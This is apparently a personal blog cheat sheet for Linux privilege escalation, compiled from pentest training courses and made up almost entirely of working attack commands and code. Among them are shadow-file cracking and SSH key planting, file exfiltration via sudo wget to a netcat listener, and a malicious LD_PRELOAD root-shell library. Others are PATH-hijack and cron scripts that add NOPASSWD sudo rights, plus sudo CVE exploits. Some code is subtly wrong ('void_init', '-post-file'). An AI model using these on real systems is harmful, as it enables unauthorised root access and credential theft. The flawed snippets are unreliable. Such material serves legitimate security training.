---
title: Privilege Escalation - Linux
author: nirajkharel
date: 2023-03-05 20:55:00 +0800
categories: [Privilege Escalation, Linux]
tags: [Privilege Escalation]
---

## Initial Enumeration
**System Enumeration**
- Enumerate the hostname: `hostname`
- Enumerate the kername info
	- `uname -a`
	- `cat /proc/version`
	- `cat /etc/issues` 
- Enumerate the architecture
	- `lscpu`
	- Sometimes the exploit requires multiple threads or multiple cores, so if the exploit requires four cores and the machines has only one, such exploit does not work.
- Enumerate the services
	- `ps aux`
	- What user is running what task or command.
	- Grep the task ran by root user only: `ps aux | grep root`


**User Enumeration**
- Who we are? What permission we have? and what we are capable of?
- Enumerate the id: `id`
- Enumerate the sudo command which a user can run: `sudo -l`
- Enumerate the users: `cat /etc/passwd`
- Check if we can access shadow file: `cat /etc/shadow`
- Check for the history: `history`


**Network Enumeration**
- Identify the open ports: `netstat -ano`
- Or, `ss -tulpn`
- Analyze the ports open in a localhost.

**Password Hunting**
- Search for the keyword password
	- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
- Find the filename which contains keyword password
	- `locate password | more`
	- `locate passwd | more`
	- `locate pass | more`

- Enumerate for SSH keys
	- `find / -name id_rsa 2> /dev/null`

## Exploring Automated Tools
- Resources
	- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
	- https://github.com/rebootuser/LinEnum
	- https://github.com/mzet-/linux-exploit-suggester
	- https://github.com/sleventyeleven/linuxprivchecker

## Kernel Exploits
- Resources
	- https://github.com/lucyoa/kernel-exploits
- Enumerate the kernal version
	- `uname -a`
- Search for the exploit on internet.

## Escalation Path: Passwords and File Permissions
**Stored Password**
- Get information from history 
	- `history`
- Get information from bash history
	- `cat .bash_history`
- Search for the keyword password
	- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`

**Escalation via Weak File Permissions**
- View the read permission on /etc/shadow and /etc/passwd.
- If a user have read permission on both of the file.
- Copy the data from both file and save separately.
- User `unshadow` command from Linux
	- unshadow passwd-file shadow-file
	- Copy the user which have data and save on a file.
- Use Hashcat to decrypt the passwords.
	- `hashcat -m 1800 unshadow.txt rockyou.txt`

**Escalation via SSH Keys**
- Enumerate id rsa (Private Key).
	- `find / -name id_rsa 2> /dev/null`
	- `chmod 600 id_rsa`
	- `ssh -i id_rsa username@IP`

- Enumerate authorized keys (Public key)
	- If the authorized_keys file is writable to the current user, this can be exploited by additing additional authorized keys.
	- `find / -name authorized_keys 2> /dev/null`
	- View the permission of the file.
	- Generate the SSH key
		- `ssh-keygen`
		- It will generate the Key and store on a file.
	- The pulic key can then be copied with the ssh-copy commannd line tool.
		- `ssh-copy-id username@IP`
	- Copy the public key to the authorized_hosts.
	- This allows to login using SSH without having to specify any private keys. (As Linux checks for private keys in the user's home directory by default)
	- `ssh username@IP`

## Escalation Path: Sudo
**Escalation via Sudo Shell Escaping**
- `sudo -l`
- It will list the application or services which can be root as sudo or whether it needs password to run or not.
- Navigate to GTFOBins and search for an application name.
- Click on SUDO and execute commands as per it.

Escalation via Intended Functionality
- With Apache2
	- There is an intented functionality on apache that allows us to view system files.
	- We can get shell and can'tedit system files, but using this, we can view system files.
	- `sudo -l` - If apache2 is listed and does not requires password.
	- `sudo apache2 -f /etc/shadow`
- With Wget
	- set up a netcat listener
		- `nc -lvnp 8001`
	- Send wget commands as such:
		- `sudo wget -post-file=<filename> <ip><port>`

**Escalation via LD_PRELOAD**
- `sudo -l`
	- We can see the environment variable LD_PRELOAD
	- It is a feature of dynamic linker (LD) which is used for preloading the library.
- We are gonna be able to execute our own library and preload that before we run anything.
- We need to make malicious library in order to do it.
- `vim shell.c`
```c
	#include <stdio.h>
	#include <sys/types.h>
	#include <stdlib.h>
	void_init(){
		unsetenv("LD_PRELOAD");
		setgid(0);
		setuid(0);
		system("/bin/bash");
	}
``` 
- Compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
- `sudo LD_PRELOAD=/full/path/shell.so <appname>`
	- Where appname is an ouput of app list from `sudo -l`

**Escalation via CVE-2019-14287**
- Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root's id.
- If we found `username ALL=(ALL:!root) /bin/bash`
- We can escalate the privilege with following:
	- `sudo -u#-1 /bin/bash`
- References: https://www.exploit-db.com/exploits/47502

**Escalation via CVE-2019-18634**
- In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process.
- This bug can be triggered even by users not listed in the sudoers file.
- There is no impact unless pwfeedback has been enabled.
- Download the payload from: https://github.com/saleemrashid/sudo-cve-2019-18634
- `./exploit`
- References: https://www.sudo.ws/security/advisories/pwfeedback/

## Escalation Path: SUID
- Find the files owned by root which have SUID.
- `find / -perm -u=s -type f 2>/dev/null`
- `ls -la <path/filename>`
- Navigate to GTFOBin and search for the filename/command.
- Select SUID and exploit as per it.

## Escalation Path: Other SUID Escalation
**Escalation via Shared Object Injection**
- During execution, a program needs to load some shared objects. In this process some system calls are made. We can view the list of these system calls using a program called strace.
- strace: Traces system calls and signals.
- Find  the files with suid bit set
  - `find / -type f -perm -04000 -ls 2>/dev/null`
  - Or, `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- Strace
  - With strace, we can find out what system calls are being made while executing the program.
  - `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
  - We should be able to overwrite some of the files on it.
- Further exploitation: https://sheetalpatil321.medium.com/linux-privilege-escalation-22f1118a1644

**Escalation via Binary Symlinks**
- When we have www-data user and if the ngnix is used on the server. We can perform nginx exploit to privilege the escalation.
- Accessed as www-data then,
  - Run linux exploit suggestor
  - Exploit the vulnerability as the suggestor suggest
  - For this attack to be successfull, the log directory for nginx must be writable.
  - Open new terminal and login as root. Password is not required.
- Resources: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html

**Escalation via Environment Variables**
- Search for the application/executable file with root permission
  - `find / -type f -perm -u=s 2>/dev/null`
- View the strings from the executable file
  - `strings /usr/local/bin/suid-env`
  - There might be the line like "service apache2 start" but if the full path is not given for the service, we can overwrite the service with new environment variable.
  - Create a script in C. 
  ```C
  int main() {
        setuid(0);
        system("/bin/bash -p");
  }
  ```
- Make it executable
  - `gcc -o service service.c`
- View the environment variables
  - `echo $PATH`
- Append a new path which is current directory.
  - `export PATH=/home/user/a-path-where-service.c-file-is-located:$PATH` 
- Run the executable
  - `/usr/local/bin/suid-env`
  - We will get a escalated shell.

## Escalation Path: Capabilities
- `getcap -r / 2>/dev/null`
- If it has ep, then,
  - Example: `/usr/bin/python2.6 -c 'import os;os.setuid(0); os.system("/bin/bash")'`
  - It can be done with python, tar, openssl, perl and many more which have ep cabailities. (ep means permitted everything)

## Escalation Path: Scheduled Tasks
- Cron is a job scheduler in Unix-based operating systems. Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server.
- By default, Cron runs as root when executing /etc/crontab, so any commands or scripts that are called by the contab will also run as root.
- We can view the information of cronjob with
  - `cat /etc/crontab`
- We can also use [pspy](https://github.com/DominicBreuker/pspy) to detect a cron job
  - `./pspy64 -pf -i 1000`

**Editing Script File**
- When a script executed by Cron is editable by unprivileged users, one can edit the script file to escalate the privilege.
- Script
```bash
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```
- Make it executable: `chmod +x script.sh`
- `/tmp/bash -p`
- or with Python
```python
#!/usr/bin/python3.9
import os
import sys
try:
	os.system('echo "current-user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
except:
	sys.exit()
```
- Make it executable: `chmod +x script.py`
- In some time, we should have had the root shell.

**Exploiting Wildcards in Commands**
- Commands can use wildcards as arguments to perform actions on more than one file at a time, also called globbing. When the command is assigned to a cronjob, contains a wildcard operator then attacker can go for wildcard injection to escalate privilege.

## Escalation Path: NFS Root Squashing

## Escalation Path: Docker

## References
- https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/
- https://tryhackme.com/room/linuxprivescarena
- https://academy.tcm-sec.com/courses/enrolled/1154399